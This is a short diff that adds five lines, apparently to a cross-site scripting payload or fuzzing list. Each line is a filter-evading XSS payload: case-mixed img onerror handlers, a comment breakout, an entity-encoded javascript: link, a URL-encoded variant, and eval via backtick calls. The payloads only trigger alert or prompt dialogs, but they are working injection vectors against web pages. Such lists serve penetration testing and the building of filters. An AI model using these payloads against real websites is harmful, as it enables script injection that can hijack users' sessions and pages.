@@ -1,0 +1,5 @@
+"><img sRc=l oNerrOr=prompt() x>
+<!--<img src=--><img src=x onerror=alert`` x>
+<a id="a"href=javascript&colon;alert&lpar;1&rpar; id="a">Click</a>
+%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e
+<iMg sRc=x:alert`` oNError=eval(src)>
